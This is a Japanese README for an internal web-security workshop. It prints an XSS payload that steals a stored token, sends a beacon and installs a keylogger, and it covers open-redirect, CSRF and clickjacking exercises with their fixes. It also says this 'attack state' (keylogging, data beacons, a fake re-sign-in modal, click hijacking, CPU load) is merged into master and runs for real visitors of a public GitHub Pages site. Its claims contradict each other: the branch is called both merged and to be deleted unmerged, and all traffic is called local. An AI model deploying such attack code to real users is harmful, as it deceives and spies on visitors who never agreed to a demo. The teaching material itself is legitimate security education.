# 社内セキュリティ勉強会用 模擬マルウェア＆脆弱デモ

> **これは何？**
> **本番ページ（`app/page.tsx`）を開いた瞬間に走る「攻撃されている状態」の実装**と、
> それを支える講義資料（旧スタンドアロンモック）です。
> 本番への組み込みは `src/security/attack-simulation.mjs` + `app/AttackState.tsx` で行われており、
> AGENTS.md の「Intentional security workshop vulnerability」節に明記されています。
> `examples/security-workshop/` 配下は補助資料（収集サーバ・クリックジャッキング演習など）です。
>
> **本番 `public/` 静的ファイルには手を入れていません**が、`app/page.tsx` は改変済みです
> （`<AttackState />` をマウント）。本番ビルドでも攻撃状態が走ります。
> クリーンな状態に戻すときは `app/page.tsx` から `<AttackState />` を削除してください。

---

## 1. セットアップ（2 コマンド）

```bash
# 端末1: 攻撃者サーバ（本番ページのビーコン/フィッシング/リダイレクト先も兼ねる）
node examples/security-workshop/attack-server.mjs

# 端末2（別プロンプト）: 攻撃URLの一覧を出力
node examples/security-workshop/build-links.mjs
```

**端末1 を起動してから本番ページを開くと、タイムライン末尾の強制リダイレクトまで実際に発生します**
（未起動のまま開くとビーコン送信のみ行われ、遷移は自動的に省略されます）。
表示される URL をブラウザで開いて演習を進めます。
すべて `127.0.0.1` 上で完結し、外部ネットワークへの通信はありません。

---

## 2. デモの位置づけ

| | 本番サイト（ShibuyaScene） | このフォルダの補助資料 |
|---|---|---|
| 脆弱性 | **あり（意図的・AGENTS.md 承認済み）** | 意図的に多数 |
| 目的 | 勉強会での「攻撃されている状態」の再現 | 講義用モック・収集サーバ |
| 場所 | `app/page.tsx` + `src/security/attack-simulation.mjs` | `examples/security-workshop/` |

> ⚠ 本番ページは「開いた瞬間に攻撃されている状態」が既定です。
> `?attack=0` を URL に付けるとその読み込みだけ完全にオフになります。
> 永久に戻すときは `app/page.tsx` から `<AttackState />` を外してください。

### 本番ページで走る攻撃のタイムライン（**master にマージ済み・GitHub Pages 公開サイトで発動**）

ページを開いてからの経過時間で攻撃がエスカレートします。
バナーの「攻撃を終了する」ボタンを押すと**今後走るはずの全段階（リダイレクト含む）もキャンセル**されます。

> ⚠ 本番 URL: https://kesusugar.github.io/shibuya-scene-public/ （PR #14 をマージ済み。
> 訪問者にも同じ攻撃状態が見えます。リダイレクト段階は訪問者環境では収集サーバが無いため自動的に省略されます。）

| 時間 | 攻撃 | 実際に起きること |
|---|---|---|
| 0秒 | 改ざん・盗み見 | 赤バナー＋画面減光、`shibuya.save`/`shibuya.pad` を読んでビーコン送信、キーロガー開始 |
| 0秒 | （URLに `?q=` がある時）| 反射型XSS — ペイロードが本物の `innerHTML` シンクで実行される |
| 8秒 | フィッシング | 偽「再サインイン」モーダル。入力すると資格情報がローカル収集サーバへ送信される |
| 20秒 | 操作妨害 | 3回に1回クリックを横取りして無効化＋偽「アプリケーションエラー」画面（再読み込みは1回だけ本物） |
| 30秒 | CPU高負荷 | マイニングの模倣 — 実際にFPSが落ちる（45秒で自動停止） |
| 50秒 | **強制リダイレクト** | 10秒カウントダウン後、**実際に** `127.0.0.1:9999/owned` へ遷移（収集サーバ起動時のみ。未起動なら省略） |

> リダイレクト先の `/owned` は攻撃者ビュー（捕獲データ一覧つき）です。「本物のサイトへ戻る」で履歴を戻れます。

> ⚠ 演習後はこのブランチをマージせず削除してください（README 最後の「後片付け」参照）。
> 「マルウェア」といっても実際のウイルスではなく、**XSS/フィッシング等の攻撃コード（ペイロード）のモック**です。

---

## 3. 演習（README の順に進めます）

| # | 脆弱性 | 攻撃の流れ | 教訓 |
|---|--------|-----------|------|
| 1 | 反射型XSS（`?q=`） | 検索窓/URL に `<img src=x onerror=...>` を注入 → トークン窃取・画面改ざん・キーロガー | `innerHTML` への生連結は禁止。`<script>` は動かないが `onerror` は動く |
| 2 | DOM XSS（`#profile=`） | ハッシュ経由でペイロード送信（サーバログに残らない） | フラグメントも「信頼できない入力」 |
| 3 | localStorage トークン保存 | XSS 1 回で全トークン流出 | トークンは `HttpOnly; Secure; SameSite` Cookie で |
| 4 | オープンリダイレクト（`?next=//…`） | `//` 始まりで検証をすり抜け、偽ログインへ誘導 | プロトコル相対 URL まで検証する。本番 `chatgpt-auth.ts` の実装が模範 |
| 5 | CSRF（GET ログアウト） | 何もしていないのに他人の URL を踏むだけで状態が変わる | 状態変更は POST + CSRF トークン |
| 6 | クリックジャッキング | 透明 iframe でクリックを奪う | `X-Frame-Options` / `frame-ancestors` ヘッダ |

> 📎 **追加演習**: 別リポジトリ [beauty_split_2](https://kesusugar.github.io/beauty_split_2/) を対象にした
> 実サイト攻撃チェーン（オリジン共有 × localStorage 毒化 × DOM XSS）は
> [examples/beauty-split-workshop/README.md](../beauty-split-workshop/README.md) を参照。

### ペイロードの基礎知識（演習1 のコード解説）

攻撃URLに含まれるのは概ね次の処理です（`build-links.mjs` で生成）。

```js
var t = localStorage.getItem('shibuya.demo.token') || '(未ログイン)'; // 1) トークン抽出
var d = document.createElement('div');
d.style.cssText = 'position:fixed;inset:0;background:#5c0000;z-index:9999;...';
d.innerHTML = '<h1>☠ このページは乗っ取られました</h1><p>盗んだトークン: ' + t + '</p>';
document.body.appendChild(d);                                  // 2) 画面改ざん（マルウェアらしさ）
new Image().src = '/collect?d=' + encodeURIComponent('TOKEN:' + t) + '&src=xss'; // 3) 窃取ビーコン
document.addEventListener('keypress', function (e) {           // 4) キーロガー
  new Image().src = '/collect?d=' + encodeURIComponent('KEY:' + e.key) + '&src=keylogger';
}, false);
```

* `<script>` タグは `innerHTML` では実行されない → `<img onerror>` で発火させる（重要ポイント）
* `new Image().src = ...` はレスポンスを読まないので CORS 制約を受けない（画像ビーコン）
* 盗み取ったデータを表示する「攻撃者パネル」側でも HTML エスケープが必要（`attack-server.mjs` の `esc()` 参照）

---

## 4. 脆弱性 → 対策 一覧

| 脆弱性 | このデモでの原因 | 本番で採るべき対策 |
|---|---|---|
| 反射型/DOM XSS | `innerHTML` に未エスケープ連結 | `textContent`、またはエスケープ → CSP 補助 |
| トークン漏えい | localStorage 保存 | `HttpOnly` Cookie、XSLeak 対策 |
| オープンリダイレクト | 無検証の `location.href = next` | `/` 始まり相対パスのみ許可 |
| CSRF | GET による状態変更・トークンなし | POST + トークン、`SameSite=Strict` |
| クリックジャッキング | ヘッダなし | `X-Frame-Options: DENY` ／ CSP `frame-ancestors` |
| リソース読み込みの緩さ | `Access-Control-Allow-Origin: *` の収集サーバ | 必要なオリジンだけ許可 |

---

## 5. 本番リポジトリとの対比（レビュー結果との対応）

セキュリティレビュー（2024-10 実施）で本番コードの類似箇所を確認済み:

* `src/player/diagnostics.mjs` の `innerHTML` はゲームパッド ID や UA など「ブラウザ由来の値」を注入しているが、静的な自サイト限定のため現状は低リスク（※今後データ起点にするならエスケープ必須）
* `src/game/save.mjs` は `sanitise()` で localStorage を検証済み（デモの VULN-3 の逆. 良い実装例）
* `app/chatgpt-auth.ts` の `safeRelativeReturnPath()` はオープンリダイレクトを正しくブロックする（デモの VULN-4 の正解例）
* `/_vinext/image` エンドポイントはパラメータ検証・SVG 無効化・CSP 付きで安全

→ 「デモで壊したものが、本番ではどう直っているか」を比較すると理解が深まります。

---

## 6. 後片付け

```bash
# 端末1 で Ctrl+C（サーバ停止）
git checkout master
git branch -D claude/security-workshop   # 演習用ブランチを削除
```

`examples/security-workshop/` ごとブランチを捨てれば本番には一切影響しません。
（マージして残したい場合は `README` を見て、本番 `public/` には置かないこと）
